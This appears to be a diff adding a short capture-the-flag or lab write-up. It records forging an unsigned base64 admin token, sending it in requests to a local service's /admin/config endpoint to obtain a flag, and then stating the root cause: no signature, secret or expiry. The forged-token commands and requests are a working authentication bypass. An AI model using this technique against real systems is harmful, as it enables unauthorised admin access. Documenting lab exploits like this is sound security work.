@@ -1,0 +1,14 @@
+Forged token: printf '{"uid":"2"}' | base64 -> eyJ1aWQiOiIyIn0=
+
+Request A: GET http://127.0.0.1:18081/admin/config?token=eyJ1aWQiOiIyIn0=
+Response: HTTP/1.0 200 OK
+{"flag": "FLAG{api_chain_ok}", "debug": true}
+
+Request B: GET http://127.0.0.1:18081/admin/config
+           Header: Authorization: Bearer eyJ1aWQiOiAiMiIsICJ1c2VyIjogImFkbWluIn0=   (token from weak /login)
+Response: HTTP/1.0 200 OK
+{"flag": "FLAG{api_chain_ok}", "debug": true}
+
+Baseline (no token): GET http://127.0.0.1:18081/admin/config -> HTTP 403 {"error": "admin only"}
+
+Root cause: _auth_user() only base64-decodes the token and reads .uid; comparison is uid != "2". No signature, no secret, no expiry => any client can mint an admin token offline.
